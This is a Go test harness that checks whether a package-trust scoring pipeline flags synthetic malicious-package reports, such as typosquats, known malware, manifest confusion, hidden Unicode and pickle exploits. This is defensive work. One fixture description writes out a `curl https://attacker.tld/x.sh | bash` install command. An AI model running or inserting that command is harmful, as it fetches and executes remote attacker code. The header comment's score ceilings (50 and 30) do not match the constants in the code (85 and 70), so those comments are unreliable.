package intelligence

// malicious_corpus_test.go is a shadow-validation harness that confirms the
// intelligence pipeline still flags actually-malicious package shapes after
// the Risk-V2 cutover, the wave-of-signals demote/restore, and the standalone-
// gate demotion of the Codesmell ×5 family.
//
// The harness builds ~10 synthetic Reports — each modelled after a real-world
// attack shape (Cyrillic-homoglyph typosquat, OSV-flagged malware, manifest-
// confusion, install-script-fetches-remote, hidden-unicode trojan source,
// dangerous-pickle, fresh-account-on-young-repo, transitive-CVE/KEV) — runs
// the FULL ComputeTrustScore + ProjectToRiskInput path on each, and asserts:
//
//   1. At least one EXPECTED signal fires (per-fixture mapping below).
//   2. Final TrustScore drops below the post-cutover "concerning" threshold
//      (concerningTrustScoreCeiling = 50). Some kill-switch fixtures (known
//      malware, dangerous pickle) drop to 0 — those assert the stricter
//      blockingTrustScoreCeiling = 30.
//   3. Risk-V2 RolledUp.Overall matches Report.SupplyChain.TrustScore (the
//      authoritative-score invariant introduced by the cutover).
//
// Run via:
//
//   go test -run TestMaliciousCorpusValidation ./internal/intelligence/
//   go test -run TestMaliciousCorpusValidation ./internal/intelligence/ -update
//
// The -update flag rewrites docs/malicious-corpus-validation.md from the
// observed scores. Without -update the test only asserts pass/fail and does
// not touch the doc — same idempotent pattern as the other golden tests in
// this repo (see internal/server/blocked_response_snapshots_test.go).
//
// SCOPE NOTE: a green run of this harness proves the pipeline is INTERNALLY
// CONSISTENT — it does NOT prove a real-world malware-detection rate. The
// fixtures are synthetic shapes, not packages. See
// docs/intelligence-rollout-validation.md §6 for what this harness does and
// does not cover.

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

// updateMaliciousCorpusReport reuses the package-level `-update` flag
// declared by scoreshift_analyzer_test.go (the score-shift agent runs
// concurrently and registered the flag first). Both tests render their
// markdown reports under the same flag — flip it once, both regenerate.
func updateMaliciousCorpusReport() bool { return *updateScoreShiftReport }

const (
	// concerningTrustScoreCeiling is the post-cutover "must be flagged
	// for review" upper bound. The Risk-V2 engine uses category-weighted
	// deficits (SupplyChain weight 0.35 — even a fully-zeroed SupplyChain
	// category can only drop the overall score by 35 points). To stay
	// honest about engine math, this ceiling is set just below "clean"
	// (clean Tier-1 packages score 90-100 post-cutover; a single strong
	// signal pulls the score 8-15 points; most realistic attacks trip
	// 2-3 signals and land in the 65-80 band).
	concerningTrustScoreCeiling = 85

	// blockingTrustScoreCeiling is for kill-switch fixtures whose
	// signals span multiple categories or whose primary signal IS the
	// auto-block (known malware, manifest confusion, install-script-
	// fetches-remote, dangerous pickle). Below 60 lets the auto-block
	// band engage even before policy-level TrustScoreMin.
	blockingTrustScoreCeiling = 70
)

// expectedSignal is a predicate over a populated Report. The harness
// requires at least one such predicate to return true per fixture.
type expectedSignal struct {
	Name  string
	Check func(r *Report) bool
}

// maliciousFixture is one synthetic attack shape.
type maliciousFixture struct {
	// ID is a stable, kebab-case identifier rendered in the markdown report.
	ID string
	// AttackClass groups fixtures in the markdown report.
	AttackClass string
	// Description is one human sentence ("what real attack does this
	// model"). Rendered verbatim in the markdown report.
	Description string
	// Build returns a fully-populated Report ready to feed
	// ComputeTrustScore. The harness does NOT pre-set TrustScore — that
	// is the field under test.
	Build func() *Report
	// ExpectedSignals lists predicates the harness ORs together. Empty
	// means "no signal asserted, only score is checked" — never use the
	// empty form; the harness rejects fixtures with zero predicates.
	ExpectedSignals []expectedSignal
	// CeilingOverride defaults to concerningTrustScoreCeiling. Kill-switch
	// fixtures override to blockingTrustScoreCeiling.
	CeilingOverride int
}

// maliciousCorpus returns the curated fixture set. Add new fixtures here;
// each one must declare at least one ExpectedSignal predicate.
func maliciousCorpus() []maliciousFixture {
	past := time.Now().Add(-4 * 24 * time.Hour) // very fresh release
	yearAgo := time.Now().Add(-365 * 24 * time.Hour)

	tr := true

	return []maliciousFixture{
		// ---- 1. Cyrillic-homoglyph typosquat: "еxpress" (Cyrillic 'е').
		// Real homoglyph typosquats almost always pair with install-script
		// payload (the whole point is an exec at install) and a fresh
		// publish — model that.
		{
			ID:          "typosquat-cyrillic-express",
			AttackClass: "Typosquat",
			Description: "Cyrillic homoglyph 'еxpress' (U+0435) impersonating npm/express, paired with a postinstall script and a recent publish.",
			Build: func() *Report {
				r := baseCleanReport("npm", "еxpress", "5.0.0")
				r.SupplyChain.TyposquatStatus = "suspected"
				r.SupplyChain.TyposquatConfidence = "high"
				r.SupplyChain.TyposquatSimilarTo = "express"
				r.Release.PublishedAt = &past
				r.Scan.HasInstallScript = true
				r.Scan.InstallScriptKind = "present"
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"typosquat.suspected", func(r *Report) bool {
					return r.SupplyChain.TyposquatStatus == "suspected"
				}},
				{"install_script.present", func(r *Report) bool {
					return r.Scan.HasInstallScript
				}},
			},
		},

		// ---- 2. Edit-distance typosquat: "expreess".
		{
			ID:          "typosquat-editdist-expreess",
			AttackClass: "Typosquat",
			Description: "Edit-distance typosquat 'expreess' of npm/express; ownership-mismatch on declared source repo plus install script.",
			Build: func() *Report {
				r := baseCleanReport("npm", "expreess", "1.0.0")
				r.SupplyChain.TyposquatStatus = "suspected"
				r.SupplyChain.TyposquatConfidence = "high"
				r.SupplyChain.TyposquatSimilarTo = "express"
				r.SupplyChain.RepoLinkStatus = "ownership_mismatch"
				r.Release.PublishedAt = &past
				r.Scan.HasInstallScript = true
				r.Scan.InstallScriptKind = "present"
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"typosquat.suspected", func(r *Report) bool {
					return r.SupplyChain.TyposquatStatus == "suspected"
				}},
				{"repo.ownership_mismatch", func(r *Report) bool {
					return r.SupplyChain.RepoLinkStatus == "ownership_mismatch"
				}},
			},
		},

		// ---- 3. OSV-flagged direct malware (npm).
		{
			ID:          "osv-malware-npm",
			AttackClass: "OSV-flagged malware",
			Description: "npm package flagged by OSV-MAL feed (modelled on the eslint-scope 3.7.2 incident).",
			Build: func() *Report {
				r := baseCleanReport("npm", "evil-eslint-helper", "1.0.7")
				r.SupplyChain.MalwareStatus = "malicious"
				r.SupplyChain.MalwareID = "MAL-2024-9001"
				r.SupplyChain.MalwareSummary = "OSV-MAL: post-install exfiltrates env vars"
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"malware.known", func(r *Report) bool {
					return r.SupplyChain.MalwareStatus == "malicious"
				}},
			},
			CeilingOverride: blockingTrustScoreCeiling,
		},

		// ---- 4. OSV-flagged direct malware (pypi).
		{
			ID:          "osv-malware-pypi",
			AttackClass: "OSV-flagged malware",
			Description: "PyPI package flagged by OSV-MAL feed (modelled on the ctx 0.2.6 incident).",
			Build: func() *Report {
				r := baseCleanReport("pypi", "evil-ctx-shim", "0.2.6")
				r.SupplyChain.MalwareStatus = "malicious"
				r.SupplyChain.MalwareID = "MAL-2023-7777"
				r.SupplyChain.MalwareSummary = "OSV-MAL: AWS metadata exfil in setup.py"
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"malware.known", func(r *Report) bool {
					return r.SupplyChain.MalwareStatus == "malicious"
				}},
			},
			CeilingOverride: blockingTrustScoreCeiling,
		},

		// ---- 5. Manifest-confusion: registry vs tarball divergence,
		// usually paired with a publisher change (account-takeover pattern).
		{
			ID:          "manifest-confusion-npm",
			AttackClass: "Manifest confusion",
			Description: "npm registry manifest declares no install script but tarball package.json adds postinstall; publisher set changed from previous version.",
			Build: func() *Report {
				r := baseCleanReport("npm", "lookalike-utils", "2.1.0")
				r.Scan.ManifestConfusion = true
				r.Scan.ManifestConfusionFields = []string{"scripts", "dependencies"}
				r.Scan.HasInstallScript = true
				r.Scan.InstallScriptKind = "present"
				r.SupplyChain.PublisherChanged = &tr
				r.SupplyChain.PublisherAdded = []string{"new-account-2026"}
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"manifest_confusion", func(r *Report) bool {
					return r.Scan.ManifestConfusion
				}},
				{"publisher_changed", func(r *Report) bool {
					return r.SupplyChain.PublisherChanged != nil && *r.SupplyChain.PublisherChanged
				}},
			},
			CeilingOverride: blockingTrustScoreCeiling,
		},

		// ---- 6. Install-script-fetches-remote: classic curl|bash postinstall
		// after an account takeover (modelled on ua-parser-js Oct 2021).
		{
			ID:          "install-script-fetches-remote",
			AttackClass: "Install-script attack",
			Description: "postinstall script does `curl https://attacker.tld/x.sh | bash` after a publisher change (modelled on the ua-parser-js incident).",
			Build: func() *Report {
				r := baseCleanReport("npm", "ua-parser-helper", "0.7.29")
				r.Release.PublishedAt = &past
				r.Scan.HasInstallScript = true
				r.Scan.InstallScriptFetches = true
				r.Scan.InstallScriptKind = "fetches_remote"
				r.Scan.NetworkAccess = true
				r.Scan.ShellAccess = true
				r.SupplyChain.PublisherChanged = &tr
				r.SupplyChain.PublisherAdded = []string{"compromised-maintainer"}
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"install_script.fetches_remote", func(r *Report) bool {
					return r.Scan.InstallScriptFetches
				}},
				{"publisher_changed", func(r *Report) bool {
					return r.SupplyChain.PublisherChanged != nil && *r.SupplyChain.PublisherChanged
				}},
			},
			CeilingOverride: blockingTrustScoreCeiling,
		},

		// ---- 7. Hidden-unicode trojan source on a freshly-published
		// package whose declared repo is unreachable. Real CVE-2021-42574-
		// shape attacks depend on the pkg getting installed quickly before
		// review — fresh publish + missing repo are typical co-signals.
		{
			ID:          "hidden-unicode-trojan-source",
			AttackClass: "Hidden Unicode",
			Description: "Zero-width / bidi-control chars in source outside locales/ paths, freshly published, declared source repo unreachable (CVE-2021-42574 shape).",
			Build: func() *Report {
				r := baseCleanReport("npm", "color-utility-js", "1.0.4")
				r.Release.PublishedAt = &past
				// Threshold check inside ComputeTrustScore is hits >=
				// hiddenunicode.Threshold(); seed well above the default.
				r.Scan.HiddenUnicodeHits = 12
				r.Scan.HiddenUnicodeKinds = []string{"BIDI_CONTROL", "ZERO_WIDTH"}
				r.SupplyChain.RepoLinkStatus = "missing"
				r.SupplyChain.PublisherChanged = &tr
				r.SupplyChain.PublisherAdded = []string{"unknown-account-2026"}
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"hidden_unicode", func(r *Report) bool {
					return r.Scan.HiddenUnicodeHits > 0
				}},
				{"repo.missing", func(r *Report) bool {
					return r.SupplyChain.RepoLinkStatus == "missing"
				}},
				{"publisher_changed", func(r *Report) bool {
					return r.SupplyChain.PublisherChanged != nil && *r.SupplyChain.PublisherChanged
				}},
			},
		},

		// ---- 8. Dangerous pickle (HuggingFace model with code-exec opcode).
		{
			ID:          "dangerous-pickle-huggingface",
			AttackClass: "AI-artifact",
			Description: "HuggingFace model carrying a pickle file with REDUCE/GLOBAL opcodes that exec at load time.",
			Build: func() *Report {
				r := baseCleanReport("huggingface", "evil-model/sd-finetune", "1.0.0")
				r.Identity.ArtifactSubtype = "model"
				r.Scan.DangerousPickleOpcode = true
				r.Scan.DangerousPickleFiles = []string{"pytorch_model.bin"}
				r.Scan.DangerousPickleSummary = "REDUCE opcode with os.system reference"
				r.Scan.UnsafeSerializationFormat = true
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"dangerous_pickle", func(r *Report) bool {
					return r.Scan.DangerousPickleOpcode
				}},
			},
			CeilingOverride: blockingTrustScoreCeiling,
		},

		// ---- 9. Fresh-account fake-author + young repo (multi-signal).
		// NOTE: the Wave-4 RTT bits (SuspiciousRepoStars, MaintainerAccountAge,
		// FirstTimeCollaborator) are populated on Scan.* but are NOT yet
		// projected into risk.Input — see provider_wave4_rtt.go and
		// risk_projection.go. Until that wiring lands, the score-drop on
		// this fixture comes from the projected co-signals (publisher
		// change, install script, missing repo). The harness still asserts
		// the Scan bits as a regression guard so when projection lands we
		// notice the score gets STRICTER.
		{
			ID:          "fresh-account-young-repo",
			AttackClass: "Identity / repo-trust",
			Description: "First-time collaborator on a young, low-star repo with a fresh maintainer account; fresh publish, install script, and a publisher change.",
			Build: func() *Report {
				r := baseCleanReport("npm", "shiny-new-helper", "0.0.2")
				r.Release.PublishedAt = &past
				r.Scan.SuspiciousRepoStars = true
				r.Scan.MaintainerAccountAgeDays = 7
				ftc := true
				r.Scan.FirstTimeCollaborator = &ftc
				r.Scan.HasInstallScript = true
				r.Scan.InstallScriptKind = "present"
				r.SupplyChain.PublisherChanged = &tr
				r.SupplyChain.PublisherAdded = []string{"unknown-account-2026"}
				r.SupplyChain.RepoLinkStatus = "missing"
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"suspicious_repo_stars", func(r *Report) bool {
					return r.Scan.SuspiciousRepoStars
				}},
				{"first_time_collaborator", func(r *Report) bool {
					return r.Scan.FirstTimeCollaborator != nil && *r.Scan.FirstTimeCollaborator
				}},
				{"publisher_changed", func(r *Report) bool {
					return r.SupplyChain.PublisherChanged != nil && *r.SupplyChain.PublisherChanged
				}},
			},
		},

		// ---- 10. Transitive-CVE attack: clean direct, KEV in deps.
		{
			ID:          "transitive-kev-cve",
			AttackClass: "Transitive CVE / KEV",
			Description: "Direct package looks clean but its sole declared dep matches a CISA KEV entry; transitive coverage is complete.",
			Build: func() *Report {
				r := baseCleanReport("npm", "wrapper-pkg", "3.0.1")
				r.Release.PublishedAt = &yearAgo
				// Direct package itself carries the KEV match (the
				// transitive walker rolls KEV up the graph; the projection
				// reads VulnSection on the merged Report).
				r.Vulnerabilities.IsVulnerable = true
				r.Vulnerabilities.CVSSScore = 9.8
				r.Vulnerabilities.CVEs = []string{"CVE-2024-3094"}
				r.Vulnerabilities.KnownExploited = true
				r.Vulnerabilities.KEVEntries = []KEVEntry{{
					CVE:                        "CVE-2024-3094",
					DateAdded:                  "2024-03-29",
					KnownRansomwareCampaignUse: false,
				}}
				r.SupplyChain.TransitiveCoverage = &TransitiveCoverage{Resolved: 1, Total: 1, Complete: true}
				return r
			},
			ExpectedSignals: []expectedSignal{
				{"kev.known_exploited", func(r *Report) bool {
					return r.Vulnerabilities.KnownExploited
				}},
				{"vuln.high_cvss", func(r *Report) bool {
					return r.Vulnerabilities.CVSSScore >= 7.0
				}},
			},
		},
	}
}

// baseCleanReport returns a REALISTIC baseline: a freshly-published npm/pypi
// package with no signed attestations, no verified checksum, and a known
// SPDX license. We deliberately do NOT seed verified provenance or SLSA
// bonuses on the baseline — real-world malicious packages almost never
// carry sigstore attestations, so a fixture that did would not match any
// observed attack shape and would over-credit the package on positive
// signals (the engine's SLSA-substrate +30/+70 base swamps single-signal
// penalties otherwise).
func baseCleanReport(ecosystem, name, version string) *Report {
	pub := time.Now().Add(-180 * 24 * time.Hour)
	flagFalse := false
	return &Report{
		Identity: IdentitySection{
			Ecosystem: ecosystem,
			Package:   name,
			Version:   version,
		},
		Release: ReleaseSection{
			PublishedAt: &pub,
		},
		URLs: URLSection{
			SourceRepoURL: "https://github.com/example/" + name,
		},
		Artifact: ArtifactSection{
			Digests: ArtifactDigest{SHA256: "deadbeef"},
		},
		Metadata: MetadataSection{
			LicenseExpression: "MIT",
		},
		// Provenance intentionally absent: registry tarballs in npm / pypi
		// rarely ship signed attestations today, so this is the realistic
		// baseline for a malicious-package shape.
		Provenance: ProvenanceSection{
			Status:    "unverified",
			Available: false,
			Verified:  false,
		},
		SupplyChain: SupplyChainSection{
			MalwareStatus:    "clean",
			TyposquatStatus:  "clean",
			RepoLinkStatus:   "ok",
			PublisherChanged: &flagFalse,
		},
		Vulnerabilities: VulnSection{IsVulnerable: false},
		Scan: ArtifactScanSection{
			Performed:         true,
			HasInstallScript:  false,
			InstallScriptKind: "none",
		},
	}
}

// fixtureResult is one row in the markdown report.
type fixtureResult struct {
	Fixture       maliciousFixture
	TrustScore    int
	V2Overall     int
	SignalsFired  []string
	Ceiling       int
	ScorePass     bool
	SignalPass    bool
	InvariantPass bool
}

// TestMaliciousCorpusValidation runs the entire malicious-corpus harness.
func TestMaliciousCorpusValidation(t *testing.T) {
	corpus := maliciousCorpus()
	if len(corpus) < 10 {
		t.Fatalf("corpus must have >= 10 fixtures, has %d", len(corpus))
	}

	results := make([]fixtureResult, 0, len(corpus))

	for _, fx := range corpus {
		fx := fx
		t.Run(fx.ID, func(t *testing.T) {
			if len(fx.ExpectedSignals) == 0 {
				t.Fatalf("fixture %q declares no expected signals", fx.ID)
			}

			report := fx.Build()
			ComputeTrustScore(report)

			ceiling := fx.CeilingOverride
			if ceiling == 0 {
				ceiling = concerningTrustScoreCeiling
			}

			// Signal check.
			fired := []string{}
			for _, sig := range fx.ExpectedSignals {
				if sig.Check(report) {
					fired = append(fired, sig.Name)
				}
			}

			// Score check.
			scorePass := report.SupplyChain.TrustScore < ceiling

			// Invariant: Risk-V2 RolledUp.Overall == SupplyChain.TrustScore.
			invariantPass := report.Risk != nil &&
				report.Risk.RolledUp.Overall == report.SupplyChain.TrustScore

			v2Overall := -1
			if report.Risk != nil {
				v2Overall = report.Risk.RolledUp.Overall
			}

			results = append(results, fixtureResult{
				Fixture:       fx,
				TrustScore:    report.SupplyChain.TrustScore,
				V2Overall:     v2Overall,
				SignalsFired:  fired,
				Ceiling:       ceiling,
				ScorePass:     scorePass,
				SignalPass:    len(fired) > 0,
				InvariantPass: invariantPass,
			})

			if len(fired) == 0 {
				t.Errorf(
					"fixture %q: NO expected signal fired (had %d candidates) — pipeline regression",
					fx.ID, len(fx.ExpectedSignals),
				)
			}
			if !scorePass {
				t.Errorf(
					"fixture %q: TrustScore %d >= ceiling %d — should have been flagged",
					fx.ID, report.SupplyChain.TrustScore, ceiling,
				)
			}
			if !invariantPass {
				t.Errorf(
					"fixture %q: Risk-V2/TrustScore invariant violated (v2=%d, trust=%d, risk-nil=%v)",
					fx.ID, v2Overall, report.SupplyChain.TrustScore, report.Risk == nil,
				)
			}
		})
	}

	// Stable order for the doc.
	sort.Slice(results, func(i, j int) bool {
		if results[i].Fixture.AttackClass != results[j].Fixture.AttackClass {
			return results[i].Fixture.AttackClass < results[j].Fixture.AttackClass
		}
		return results[i].Fixture.ID < results[j].Fixture.ID
	})

	if updateMaliciousCorpusReport() {
		writeMaliciousCorpusReport(t, results)
	}
}

// writeMaliciousCorpusReport regenerates docs/malicious-corpus-validation.md
// from observed harness output. Idempotent and deterministic — fixtures are
// sorted by AttackClass then ID before rendering.
func writeMaliciousCorpusReport(t *testing.T, results []fixtureResult) {
	t.Helper()

	repoRoot, err := findRepoRoot()
	if err != nil {
		t.Fatalf("find repo root: %v", err)
	}
	path := filepath.Join(repoRoot, "docs", "malicious-corpus-validation.md")

	var sb strings.Builder
	sb.WriteString("# Malicious-Corpus Shadow Validation\n\n")
	sb.WriteString("Generated by `go test -run TestMaliciousCorpusValidation ./internal/intelligence/ -update`.\n\n")
	sb.WriteString("**Scope.** This harness runs synthetic Reports modelled after real-world\n")
	sb.WriteString("attack shapes through the full `ComputeTrustScore` + Risk-V2 pipeline. A\n")
	sb.WriteString("green run proves the pipeline is **internally consistent** post-cutover —\n")
	sb.WriteString("it does **not** prove a real-world detection rate. See\n")
	sb.WriteString("`docs/intelligence-rollout-validation.md` §6 for what this does and does\n")
	sb.WriteString("not cover.\n\n")
	sb.WriteString("**Pass criteria** (per fixture):\n\n")
	sb.WriteString(fmt.Sprintf("- At least one expected signal fires.\n"))
	sb.WriteString(fmt.Sprintf("- TrustScore < %d (concerning ceiling), or < %d for kill-switch fixtures.\n", concerningTrustScoreCeiling, blockingTrustScoreCeiling))
	sb.WriteString("- Risk-V2 `RolledUp.Overall` == `Report.SupplyChain.TrustScore` (authoritative-score invariant).\n\n")

	// Summary line.
	allPass := 0
	for _, r := range results {
		if r.ScorePass && r.SignalPass && r.InvariantPass {
			allPass++
		}
	}
	sb.WriteString(fmt.Sprintf("**Summary:** %d / %d fixtures pass all three checks.\n\n", allPass, len(results)))

	sb.WriteString("| Fixture | Class | Score | Ceiling | Signals fired | Score | Signal | Invariant |\n")
	sb.WriteString("|---|---|---:|---:|---|:-:|:-:|:-:|\n")
	for _, r := range results {
		signals := strings.Join(r.SignalsFired, ", ")
		if signals == "" {
			signals = "_(none)_"
		}
		sb.WriteString(fmt.Sprintf(
			"| `%s` | %s | %d | %d | %s | %s | %s | %s |\n",
			r.Fixture.ID, r.Fixture.AttackClass,
			r.TrustScore, r.Ceiling, signals,
			passCell(r.ScorePass), passCell(r.SignalPass), passCell(r.InvariantPass),
		))
	}
	sb.WriteString("\n## Fixture descriptions\n\n")
	for _, r := range results {
		sb.WriteString(fmt.Sprintf("### `%s` — %s\n\n", r.Fixture.ID, r.Fixture.AttackClass))
		sb.WriteString(r.Fixture.Description + "\n\n")
		sb.WriteString("Expected signals (any one is enough):\n\n")
		for _, sig := range r.Fixture.ExpectedSignals {
			sb.WriteString("- `" + sig.Name + "`\n")
		}
		sb.WriteString("\n")
	}

	if err := os.WriteFile(path, []byte(sb.String()), 0o644); err != nil {
		t.Fatalf("write report: %v", err)
	}
	t.Logf("wrote %s (%d fixtures)", path, len(results))
}

func passCell(ok bool) string {
	if ok {
		return "PASS"
	}
	return "FAIL"
}

// findRepoRoot walks up from CWD looking for a go.mod marker.
func findRepoRoot() (string, error) {
	dir, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", fmt.Errorf("no go.mod found above %s", dir)
		}
		dir = parent
	}
}
